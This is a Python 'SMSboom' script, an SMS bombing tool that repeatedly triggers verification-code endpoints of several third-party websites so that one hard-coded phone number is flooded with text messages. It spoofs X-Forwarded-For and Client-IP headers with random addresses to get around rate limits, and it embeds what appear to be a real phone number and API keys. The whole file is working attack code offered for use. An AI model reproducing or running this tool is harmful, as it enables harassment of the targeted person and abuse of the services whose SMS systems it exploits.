# -*- ecoding: utf-8 -*-
# @ModuleName: SMSboom

#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import re
import threading
import os
import random
import socket
import struct
import time

########################################
phone = "18532051622"
########################################


# 短信接口API 请求间隔时间 备注 请求方式 请求参数 需要SESSION的先决请求URL以及Referer
APIList = [


    ["http://reg.ztgame.com/common/sendmpcode?source=giant_site&nonce=&type=verifycode&token=&refurl=&cururl=http://reg.ztgame.com/&mpcode=&pwd=&tname=&idcard=",
        60, "巨人网络", "GET", {'phone': phone}, "http://reg.ztgame.com/"],



    # ["http://cta613.org/sendsms.php", 60, "支教", "POST", {"y": "1", "sj": phone}, ""],

    # ["http://sns.qnzs.youth.cn/ajax/passportSendSms", 120, "青年之声", "POST", {"mobile": phone},
    #  "http://sns.qnzs.youth.cn/user/passport"],
    #---------------------------------------------------------------------

    ['https://php.wenxuesucai.com/interface/bjsj/api/function/phoneMsg/code.php',60,'juejingbao','GET',{'tbl': 'phoneMsg','appKey':'hshxfnfofjfqfkfhfthxhyhxfgfqfxfqhxhohxfyfxfkfogvfihxhyhxhghfhhhfhphxhohxftfgfshxhyhxfnfpfjfwfkgufxfdhxhohxfhfjfifkhxhyhxftfdhigtgngmgsghgqgdhxhohxfxfkfhfofkftgrfkfbhxhyhghghdhlhqhphhhlhu','phone':phone},''],

    #6589199117f76  https://blog.csdn.net/youlanjihua/article/details/133683537
    ['http://youlanjihua.com/youlanApi/v1/phonecode/validate.php',10,'plan','GET',{'secret':'smtr01qq','phone':phone},''],

]


########################################

class initSMS(object):
    """docstring for initSMS"""

    def __init__(self):
        super(initSMS, self).__init__()
        self.SMSList = []
        self.intervalInfo = 0

    def initBomb(self):
        for x in APIList:
            self.intervalInfo += 1
            self.SMSList.append(SMSObject(x[0], x[1], x[2], x[3], x[4], x[5], self.intervalInfo))
        return self.SMSList


class SMSObject(object):
    """docstring for SMSObject"""  # __var 私有成员变量

    def __init__(self, url, interval, info, method, params, others, intervalInfo):
        super(SMSObject, self).__init__()
        self.__url = url
        self.__interval = interval
        self.__info = info
        self.__intervalInfo = intervalInfo
        self.__method = method
        self.__params = params
        self.__others = others

    def getUrl(self):
        return self.__url

    def getInfo(self):
        return self.__info

    def getParams(self):
        return self.__params

    def getMethod(self):
        return self.__method

    def getOthers(self):
        return self.__others

    def getInterval(self):
        return self.__interval

    def getintervalInfo(self):
        return self.__intervalInfo

    def setintervalInfo(self, intervalInfo):
        self.__intervalInfo = intervalInfo

class Bomb(object):
    """docstring for Bomb"""

    def __init__(self):
        super(Bomb, self).__init__()
        self.HEADERS = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36',
            'Referer': 'http://10.13.0.1',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'zh-CN,zh-TW;q=0.8,zh;q=0.6,en;q=0.4,ja;q=0.2',
            'cache-control': 'max-age=0',
            "X-Requested-With": "XMLHttpRequest"
        }

    def send(self, SMS):
        # return "SUCCESS"
        IP = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
        self.HEADERS['X-FORWARDED-FOR'] = IP
        self.HEADERS['CLIENT-IP'] = IP
        session = requests.Session()
        if SMS.getOthers() != "":
            session.get(SMS.getOthers(), timeout=5, headers=self.HEADERS)
            self.HEADERS['Referer'] = SMS.getOthers()
        try:
            if SMS.getMethod() == "GET":
                req = session.get(SMS.getUrl(), params=SMS.getParams(), timeout=5, headers=self.HEADERS)
            else:
                req = session.post(SMS.getUrl(), data=SMS.getParams(), timeout=5, headers=self.HEADERS)
            # print(req.url)
        except Exception as e:
            return str(e)
        return "已发送"


if __name__ == '__main__':
    print("接口数：" + str(len(APIList))) # 增加接口  100
    SMSList = initSMS().initBomb()
    switchOn = Bomb()
    i = 0
    currTime = 0
    while True:
        currTime += 1
        # print(currTime)
        for x in SMSList:
            if x.getintervalInfo() == 0:
                i += 1
                info = switchOn.send(x)
                print(str(i) + "." + x.getInfo() + " " + info)
                x.setintervalInfo(x.getInterval())
            else:
                x.setintervalInfo(x.getintervalInfo() - 1)
        time.sleep(1)




